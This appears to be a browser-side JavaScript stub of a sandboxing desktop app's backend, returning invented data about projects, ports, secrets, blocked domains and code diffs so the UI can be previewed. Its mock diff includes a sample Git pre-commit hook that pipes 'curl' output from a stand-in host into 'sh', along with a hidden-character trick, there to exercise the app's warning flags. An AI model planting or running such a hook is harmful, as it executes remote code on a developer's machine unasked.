// A stand-in for window.__TAURI__, for looking at ui/ in a plain browser.
// Every answer has the shape the Rust side sends (src-tauri/src/ops.rs and
// lib.rs). The values are made up. This file is never bundled: the app's
// frontendDist is ../ui only.
//
// The scene comes from ?scene=: empty, projects, starting (holds the start
// part-way), confirming (holds it at the Touch ID prompt), stopped, nodaemon.
'use strict';

(() => {
  const params = new URLSearchParams(location.search);
  const scene = params.get('scene') || 'projects';
  const hold = scene === 'starting';
  const holdAtConfirm = scene === 'confirming';
  const METHOD = 'Touch ID or your login password';

  const STATE = '/Users/ana/.secbox';
  const SHOP = STATE + '/remote/7f3a9c0e21/demo_shop';
  const DOCS = '/Users/ana/code/docs-site';
  const BILLING = '/Users/ana/code/billing-api';

  const projects = scene === 'empty' ? [] : [
    { name: 'demo_shop', path: SHOP, state: (scene === 'stopped' || scene === 'confirming') ? 'stopped' : 'running', label: (scene === 'stopped' || scene === 'confirming') ? 'Stopped' : 'Running' },
    { name: 'docs-site', path: DOCS, state: 'none', label: 'No sandbox' },
    { name: 'billing-api', path: BILLING, state: 'stopped', label: 'Stopped' },
  ];
  const daemonRunning = scene !== 'nodaemon';

  const resources = { memory: '6 GB', cpus: '4', disk: '30 GB', build_memory: '8 GB', clamped: false };
  let limitChoice = { memory_bytes: null, millicpus: null, disk_bytes: null };
  // The ports a person chose, by the number the project publishes.
  const portChoice = {
    3000: { open: true, mac: 3001 },
    8080: { open: true, mac: 8080 },
    5432: { open: false, mac: 5432 },
  };

  function status(path) {
    const row = projects.find((p) => p.path === path) || { state: 'none', label: 'No sandbox' };
    const running = row.state === 'running';
    return {
      path,
      state: row.state,
      label: row.label,
      services: running ? [
        { name: 'web', state: 'running (healthy)' },
        { name: 'api', state: 'running (healthy)' },
        { name: 'worker', state: 'running' },
        { name: 'postgres', state: 'running (healthy)' },
      ] : [],
      ports: running ? ['127.0.0.1:3000', '127.0.0.1:8080'] : [],
      resources: row.state === 'none' ? null : resources,
      usage: running ? {
        cpu: '1.3 of 4 CPUs', cpu_percent: 32,
        memory: '5.6 GB of 8 GB', memory_percent: 70,
        disk: '28.5 GB of 30 GB', disk_percent: 95,
        host_memory: '7.8 GB',
      } : null,
      blocked_total: row.state === 'none' ? null : 41,
      blocked_domains: row.state === 'none' ? null : 3,
      exposure: row.state === 'none' ? [] : [
        'STRIPE_KEY is given to api',
        'DATABASE_URL is given to api, worker',
        'Code in those services could send them to this host, and nowhere else:',
        '  api.stripe.com',
      ],
      notes: running ? ['These came from inside the sandbox, so they can be wrong.'] : [],
      log_services: running ? ['api', 'postgres', 'web', 'worker'] : [],
    };
  }

  const plan = {
    path: SHOP,
    digest: '9e1d4c07a3b2f6118d0c55e2a1f4b3c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3',
    summary: [
      '4 services from commit 4f2c1a9e0b7d',
      'Forward to 127.0.0.1:  3000  8080  5432',
      'Anything on this machine could then reach them.',
      '3 hosts allowed for the build, 1 while it runs.',
      'Build hosts stay reachable after the build.',
    ],
    services: ['web', 'api', 'worker', 'postgres'],
    commit: '4f2c1a9e0b7d5c3a2f1e0d9c8b7a6f5e4d3c2b1a',
    ports: [
      { service: 'web', host_port: 3000, mac_port: 3001, container_port: 3000, chosen: true, note: 'Asked for every interface; forwarded on 127.0.0.1 only.' },
      { service: 'api', host_port: 8080, mac_port: 8080, container_port: 8080, chosen: true, note: null },
      { service: 'postgres', host_port: 5432, mac_port: 5432, container_port: 5432, chosen: false, note: null },
    ],
    build_hosts: ['registry.npmjs.org', 'deb.debian.org', 'pypi.org'],
    run_hosts: ['api.stripe.com'],
    secrets: ['STRIPE_KEY: put in the environment for api', 'DATABASE_URL: put in the environment for api, worker'],
    resources,
    findings: [
      'High (worker): asks for privileged: true. It is dropped.',
      'Medium (web): mounts ./. It stays inside the sandbox and never reaches your disk.',
    ],
    warnings: [],
    generated_compose: [],
    exposure: [
      'STRIPE_KEY is given to api',
      'DATABASE_URL is given to api, worker',
      'Code in those services could send them to any of these 4 hosts, and nowhere else:',
      '  api.stripe.com',
      '  deb.debian.org',
      '  pypi.org',
      '  registry.npmjs.org',
    ],
    blockers: [],
  };

  // Names only, as the daemon sends them. The stub keeps no value: it records
  // that one arrived, so shoot.js can check it left the page.
  const secretRows = [
    { name: 'DATABASE_URL', stored: true, services: ['api', 'worker'], goes_to: 'api, worker: injected into the environment' },
    { name: 'SENDGRID_API_KEY', stored: false, services: [], goes_to: 'not set yet' },
    { name: 'SENTRY_DSN', stored: false, services: [], goes_to: 'not set yet' },
    { name: 'STRIPE_KEY', stored: true, services: ['api'], goes_to: 'api: injected into the environment' },
  ];
  const secretServices = ['web', 'api', 'worker', 'postgres'];

  const blocked = {
    recording: true,
    total: 41,
    rows: [
      { time: '2026-11-06 14:06:09', count: 28, domain: 'telemetry.example-cdn.com' },
      { time: '2026-11-06 14:05:51', count: 9, domain: 'sentry.io' },
      { time: '2026-11-06 14:02:12', count: 4, domain: 'fonts.googleapis.com' },
    ],
    notes: [
      { weight: 'warn', text: "This shows blocked hostnames only. Raw IP, metadata and UDP attempts are blocked but not recorded, so an empty list doesn't mean nothing was tried." },
      { weight: 'plain', text: 'The engine writes this record on the host. As measured, the guest cannot write to its folder, but the guest does choose what it looks up.' },
    ],
  };

  // What the daemon refused or what failed, as ops' problems() reads it from
  // the audit log. Times are a while before now, so the rail's count shows.
  const NOW = Math.floor(Date.now() / 1000);
  const problem = (minutesAgo, project, what, why) => {
    const at = NOW - minutesAgo * 60;
    const row = projects.find((p) => p.name === project);
    return {
      time: new Date(at * 1000).toISOString().slice(0, 19).replace('T', ' '),
      at_unix: at,
      project: project,
      project_path: row ? row.path : null,
      what,
      why,
    };
  };
  const problemRows = scene === 'empty' ? [
    problem(3, null, 'Fetch git@codeberg.org:acme/does-not-exist.git', "The host's key is not in your known_hosts. Check it and add it by connecting once yourself: ssh -T git@codeberg.org"),
  ] : [
    problem(3, null, 'Fetch git@codeberg.org:acme/does-not-exist.git', "The host's key is not in your known_hosts. Check it and add it by connecting once yourself: ssh -T git@codeberg.org"),
    problem(26, 'demo_shop', 'Push', 'pushing to main is not allowed from a sandbox. Make a branch with git switch -c NAME, then push that'),
    problem(31, 'demo_shop', 'Push', 'not confirmed with Touch ID or your login password, so nothing was done: you cancelled (LocalAuthentication -2)'),
    problem(95, 'billing-api', 'Start', 'Not confirmed: nobody answered within 120 seconds'),
    problem(240, 'demo_shop', 'Push', 'deleting a branch from a sandbox is not allowed: refs/heads/old-refunds'),
    problem(242, 'demo_shop', 'Push', 'only branches can be pushed, not refs/tags/v0.3'),
    problem(1500, 'docs-site', 'Allow a hostname', 'Not confirmed: you cancelled (LocalAuthentication -2)'),
    problem(2900, null, 'Fetch git@github.com:acme/payments.git', 'No key was accepted. Load yours into your SSH agent with ssh-add, or unlock 1Password, then try again. A key with a passphrase works only through an agent, because nothing can ask for it.'),
  ];

  const unread = (reason) => ({ unread: reason, added: 0, removed: 0, truncated: false, hunks: [] });
  const text = (old_start, new_start, lines) => ({
    unread: null,
    added: lines.filter(([kind]) => kind === 'added').length,
    removed: lines.filter(([kind]) => kind === 'removed').length,
    truncated: false,
    hunks: [{ old_start, new_start, lines: lines.map(([kind, text]) => ({ kind, text })) }],
  });
  const refunds = text(12, 12, [
    ['context', 'export async function refund(charge: Charge) {'],
    ['removed', '\tawait stripe.refunds.create({ charge: charge.id });'],
    ['added', '\tconst refund = await stripe.refunds.create({ charge: charge.id, reason: charge.reason });'],
    ['added', '\tawait audit.record(refund);'],
    ['context', '\treturn charge;'],
    ['context', '}'],
  ]);
  const hook = text(0, 1, [
    ['added', '#!/bin/sh'],
    ['added', 'curl -s https://telemetry.example-cdn.com/x | sh'],
    ['added', 'echo "hidden\\u{202e}txt"'],
  ]);
  const withheld = unread('Not shown, because it looks like it holds a secret. A sandbox can cause this on purpose by planting a key-shaped string, so treat this file as unread.');

  const diff = {
    baseline: '4f2c1a9e0b7d',
    flags: [
      { path: '.git/hooks/pre-commit', message: 'adds a Git hook, which would run on your machine the next time you commit there' },
      { path: 'package.json:14', message: 'adds a postinstall script: node scripts/setup.js' },
    ],
    files: [
      { change: 'modified', path: 'src/billing/refunds.ts', patch: refunds },
      { change: 'added', path: 'src/billing/refunds.test.ts', patch: text(0, 1, [['added', "test('refund is audited', () => {});"]]) },
      { change: 'modified', path: 'src/api/routes.ts', patch: withheld },
      { change: 'added', path: 'migrations/0042_refunds.sql', patch: text(0, 1, [['added', 'ALTER TABLE charges ADD COLUMN refunded_at timestamptz;']]) },
      { change: 'deleted', path: 'src/legacy/charge_v1.ts', patch: text(1, 0, [['removed', 'export const VERSION = 1;']]) },
      { change: 'modified', path: 'package.json', patch: text(14, 14, [['added', '    "postinstall": "node scripts/setup.js",']]) },
      { change: 'added', path: '.git/hooks/pre-commit', patch: hook },
    ],
    notes: [
      { weight: 'alert', text: '2 flags to look at. Flags are a heuristic aid. Read the changes yourself before anything from this sandbox reaches your machine.' },
      { weight: 'alert', text: '1 file was not shown in full. Treat what is missing as unread.' },
      { weight: 'warn', text: 'Nothing was copied out of the sandbox. Export is not built yet.' },
    ],
  };

  const LOG = [
    'web       | ready on http://0.0.0.0:3000\n',
    'api       | listening on :8080\n',
    'postgres  | database system is ready to accept connections\n',
    'worker    | connected to queue "emails"\n',
    'api       | POST /charges 201 182ms\n',
    'api       | stripe: using key [STRIPE_KEY]\n',
    'web       | GET /dashboard 200 41ms\n',
    'worker    | error: getaddrinfo ENOTFOUND sentry.io\n',
    'worker    | retrying in 30s\n',
    'api       | GET /customers?page=2 200 23ms\n',
  ];

  const later = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
  let nextLog = 1;

  class Channel {
    constructor() { this.onmessage = null; }
    send(message) { if (this.onmessage) this.onmessage(message); }
  }

  async function invoke(cmd, args) {
    args = args || {};
    window.__calls = window.__calls || [];
    window.__calls.push({ cmd, args: JSON.parse(JSON.stringify(args, (k, v) => (v instanceof Channel ? '[channel]' : v))) });
    await later(30);
    const needDaemon = !['app_info', 'daemon_state', 'list_projects', 'start_daemon', 'logs_stop', 'problems'].includes(cmd);
    if (needDaemon && !daemonRunning) throw 'The daemon is not running. Start it from the menu bar icon.';
    switch (cmd) {
      case 'app_info':
        return { product: 'secbox', cli_bin: 'secbox', daemon_bin: 'secboxd', version: '0.1.0', state_dir: STATE, bundled_cli: '/Applications/secbox.app/Contents/MacOS/secbox' };
      case 'daemon_state':
        // As the app opens with no daemon: starting for a moment, then a note.
        if (scene === 'daemon-starting' && performance.now() < 3000) {
          return { running: false, starting: true, message: 'Nothing answered on the socket.', notice: null };
        }
        if (scene === 'daemon-starting') {
          return { running: true, starting: false, message: null, notice: 'Started secboxd. It keeps running after you quit the app.' };
        }
        return { running: daemonRunning, starting: false, message: daemonRunning ? null : 'Nothing answered on the socket.', notice: null };
      case 'start_daemon':
        return args.restart ? 'Restarted secboxd.' : 'The daemon is already running.';
      case 'list_projects':
        return daemonRunning ? projects : projects.map((p) => Object.assign({}, p, { state: 'no_answer', label: 'No answer' }));
      case 'add_project':
        projects.push({ name: args.path.split('/').filter(Boolean).pop(), path: args.path, state: 'none', label: 'No sandbox' });
        return 'Added.';
      case 'import_remote':
        if (!projects.some((p) => p.path === SHOP)) projects.push({ name: 'demo_shop', path: SHOP, state: 'none', label: 'No sandbox' });
        return { project_path: SHOP, commit: '4f2c1a9e0b7d5c3a2f1e0d9c8b7a6f5e4d3c2b1a', fetched: true, message: 'Fetched ' + args.url + ' at 4f2c1a9e0b7d. Your key stayed on this machine.' };
      case 'status':
        return status(args.project);
      case 'plan':
        // Limits a person saved are in the plan, as they are in the daemon's.
        return Object.assign({}, plan, {
          path: args.project,
          resources: {
            memory: limitChoice.memory_bytes ? limitChoice.memory_bytes / 2 ** 30 + ' GB' : resources.memory,
            cpus: limitChoice.millicpus ? String(limitChoice.millicpus / 1000) : resources.cpus,
            disk: limitChoice.disk_bytes ? limitChoice.disk_bytes / 2 ** 30 + ' GB' : resources.disk,
            build_memory: limitChoice.memory_bytes ? limitChoice.memory_bytes / 2 ** 30 + ' GB' : resources.build_memory,
            clamped: false,
          },
        });
      case 'up': {
        const ch = args.onProgress;
        const steps = ['planning', 'confirm', 'sandbox', 'snapshot', 'docker', 'secrets', 'build'];
        for (const step of steps) {
          ch.send({ step, detail: step === 'build' ? 'web, api, worker' : step === 'confirm' ? METHOD : null });
          if (hold && step === 'docker') return new Promise(() => {});
          if (holdAtConfirm && step === 'confirm') return new Promise(() => {});
          await later(40);
        }
        const row = projects.find((p) => p.path === args.project);
        if (row) { row.state = 'running'; row.label = 'Running'; }
        return 'Started in 41s.' + (args.ports.length ? ' Forwarded to ' + args.ports.map((p) => '127.0.0.1:' + p).join(', ') + '.' : '');
      }
      case 'down': {
        const row = projects.find((p) => p.path === args.project);
        if (row) { row.state = 'stopped'; row.label = 'Stopped'; }
        return 'Stopped. Its data is kept for the next start.';
      }
      case 'destroy': {
        const row = projects.find((p) => p.path === args.project);
        if (row) { row.state = 'none'; row.label = 'No sandbox'; }
        return 'Destroyed. Rotate every secret it was given.';
      }
      case 'remove_project': {
        const i = projects.findIndex((p) => p.path === args.project);
        if (i >= 0) projects.splice(i, 1);
        return 'Removed, with its imported copy. The remote itself was not touched. Any secrets you stored for it stay in your keychain.';
      }
      case 'logs': {
        const id = nextLog++;
        const ch = args.onEvent;
        (async () => {
          for (const line of LOG) {
            if (!args.service || line.startsWith(args.service)) ch.send({ kind: 'text', text: line });
          }
          if (!args.follow) ch.send({ kind: 'end', note: null });
        })();
        return id;
      }
      case 'logs_stop':
        return null;
      case 'blocked':
        return blocked;
      case 'problems': {
        const rows = args.project ? problemRows.filter((r) => r.project_path === args.project) : problemRows;
        return { rows, notes: rows.length ? [] : [{ weight: 'plain', text: 'Nothing has been refused recently.' }] };
      }
      case 'resource_choices':
      case 'set_resources': {
        const GIB = 1024 * 1024 * 1024;
        if (args.choice) limitChoice = args.choice;
        const row = projects.find((p) => p.path === args.project) || { state: 'none' };
        const current = row.state === 'none' ? null : { memory_bytes: 6 * GIB, millicpus: 4000, disk_bytes: 30 * GIB, build_memory_bytes: 8 * GIB, clamped: false };
        const next = {
          memory_bytes: limitChoice.memory_bytes || 6 * GIB,
          millicpus: limitChoice.millicpus || 4000,
          disk_bytes: limitChoice.disk_bytes || 30 * GIB,
          build_memory_bytes: limitChoice.memory_bytes || 8 * GIB,
          clamped: false,
        };
        const differs = !!current && (next.memory_bytes !== current.memory_bytes || next.millicpus !== current.millicpus || next.disk_bytes !== current.disk_bytes);
        return {
          project_id: 'p', chosen: limitChoice, current, next, problem: null,
          restart_needed: row.state === 'running' && differs,
          max_memory_bytes: 30 * GIB, max_millicpus: 11000, max_disk_bytes: 400 * GIB,
        };
      }
      case 'port_choices':
      case 'set_port': {
        if (args.port !== undefined) {
          if (args.macPort !== null && args.macPort !== undefined && args.macPort < 1024) {
            throw 'port ' + args.macPort + ' is below 1024, and those are kept for the system. Choose 1024 or above.';
          }
          const c = portChoice[args.port];
          c.open = args.open;
          if (args.macPort) c.mac = args.macPort;
        }
        const row = projects.find((p) => p.path === args.project) || { state: 'none' };
        const running = row.state === 'running';
        const nowOpen = { 3000: 3000, 8080: 8080 };
        const ports = [
          { service: 'web', container_port: 3000, port: 3000 },
          { service: 'api', container_port: 8080, port: 8080 },
          { service: 'postgres', container_port: 5432, port: 5432 },
        ].map((p) => ({
          ...p,
          mac_port: portChoice[p.port].mac,
          open: portChoice[p.port].open,
          open_now: running ? (nowOpen[p.port] || null) : null,
          cannot_open: null,
        }));
        const restart = running && ports.some((p) => (p.open ? p.mac_port : null) !== p.open_now);
        return { project_id: 'p', ports, problem: null, restart_needed: restart };
      }
      case 'secrets':
        return { rows: JSON.parse(JSON.stringify(secretRows)), services: secretServices.slice(), note: null };
      case 'set_secret': {
        if (!/^[A-Za-z_][A-Za-z0-9_]*$/.test(args.name)) throw 'that is not a valid secret name. Use letters, digits and underscores, starting with a letter or underscore';
        if (!args.value) throw 'an empty value was not stored';
        for (const s of args.services) if (!secretServices.includes(s)) throw 'this project has no service named ' + s;
        window.__secretsReceived = (window.__secretsReceived || 0) + 1;
        const services = args.services.slice().sort();
        let row = secretRows.find((r) => r.name === args.name);
        const replaced = !!(row && row.stored);
        if (!row) { row = { name: args.name }; secretRows.push(row); secretRows.sort((a, b) => a.name.localeCompare(b.name)); }
        Object.assign(row, { stored: true, services, goes_to: services.length ? services.join(', ') + ': injected into the environment' : 'no service' });
        return (replaced ? 'Replaced ' : 'Stored ') + args.name + ' in your keychain. ' + (services.length ? 'It goes to ' + services.join(', ') + '.' : 'It goes to no service yet.') + ' The running sandbox gets it on its next start.';
      }
      case 'secret_files':
        return { sandbox: ['.env.simulation'], host: [], note: null };
      case 'read_secret_file':
        return {
          source: args.source,
          names: [
            { name: 'SIMULATED_API_TOKEN', effect: 'store' },
            { name: 'SIMULATED_SESSION_SECRET', effect: 'store' },
            { name: 'STRIPE_KEY', effect: 'replace' },
            { name: 'WAITING_FOR_ONE', effect: 'empty' },
          ],
          names_only: false,
          services: secretServices.slice(),
          services_note: null,
        };
      case 'use_secret_file':
        for (const name of args.names) {
          if (!secretRows.find((r) => r.name === name)) secretRows.push({ name, stored: true, services: args.services.slice(), goes_to: args.services.join(', ') + ': injected into the environment' });
        }
        secretRows.sort((a, b) => a.name.localeCompare(b.name));
        return 'Stored ' + args.names.length + ' in your keychain. They go to ' + args.services.join(', ') + '. The running sandbox gets them on its next start.';
      case 'open_in_vscode':
        return null;
      case 'connect_agent':
        return { folder: '~/secbox-agents/shop', command: 'cd ~/secbox-agents/shop && claude', opened: true };
      case 'approve_host':
        return args.host + ' is allowed now. Its data was kept, and its services restarted in 37s.';
      case 'diff':
        await later(100);
        return diff;
      case 'git':
        if (args.op === 'run') {
          const pullStuck = args.args[0] === 'pull' && !args.args.includes('--autostash');
          return {
            ok: !pullStuck,
            title: 'git ' + args.args[0] + (pullStuck ? ' failed' : ' done'),
            output: pullStuck
              ? ['Updating 9a96291..4e04d53', 'error: Your local changes to the following files would be overwritten by merge:', '\tcompose.yaml', 'Please commit your changes or stash them before you merge.', 'Aborting']
              : args.args[0] === 'log' ? ['4f2c1a9 Fix the refund total', '9a96291 Add refunds'] : [],
            updates: [],
            branch: 'refunds',
            refused: null,
          };
        }
        return {
          ok: true,
          title: { status: 'Status', pull: 'Pull', commit: 'Commit', push: 'Push' }[args.op] + ' done',
          output: args.op === 'status' ? ['On branch refunds', 'Changes not staged for commit:', '  modified:   src/billing/refunds.ts'] : [],
          updates: args.op === 'push' ? ['refunds 0000000000 -> 4f2c1a9e0b'] : [],
          branch: 'refunds',
          refused: null,
        };
      default:
        throw 'The stub has no answer for ' + cmd;
    }
  }

  window.__TAURI__ = { core: { invoke, Channel } };
})();
